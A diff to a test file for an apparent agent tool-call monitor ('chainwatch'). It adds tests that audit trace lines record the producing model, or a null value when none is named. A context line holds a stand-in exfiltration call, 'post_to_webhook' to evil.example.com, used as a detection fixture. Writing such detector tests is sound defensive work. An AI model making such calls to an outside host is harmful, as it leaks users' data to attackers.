@@ -616,3 +616,39 @@ def test_daemon_wire_form_carries_provenance():
     call = ObservedCall("post_to_webhook", {"url": "https://evil.example.com/c"}, "s", 1000.0)
     verdict = analyzer.submit(call)
     assert verdict_to_dict(verdict)["provenance"] == "UNATTESTED"
+
+
+def test_trace_line_carries_model():
+    """note 32 -- the producing model is recorded, never inferred."""
+    from chainwatch import audit
+
+    line = audit.build_trace_line(
+        session="s1",
+        label="benign",
+        source="agentdojo",
+        call=1,
+        server="adojo",
+        tool="get_unread_emails",
+        stage=1,
+        severity="NONE",
+        rules=[],
+        blocked=False,
+        provenance="UNKNOWN",
+        vector=[0] * 20,
+        model="claude-opus-5",
+    )
+    assert line["model"] == "claude-opus-5"
+
+
+def test_trace_line_model_is_null_not_absent_when_unasserted():
+    """An explicit null says the capture named no model.
+
+    An absent key would be indistinguishable from a reader that never looked,
+    and the fact cannot be recovered afterwards -- the transcripts hold only prose.
+    """
+    from chainwatch import audit
+
+    line = audit.build_trace_line(
+        server="stub", tool="t", stage=1, severity="NONE", rules=[], blocked=False
+    )
+    assert "model" in line and line["model"] is None
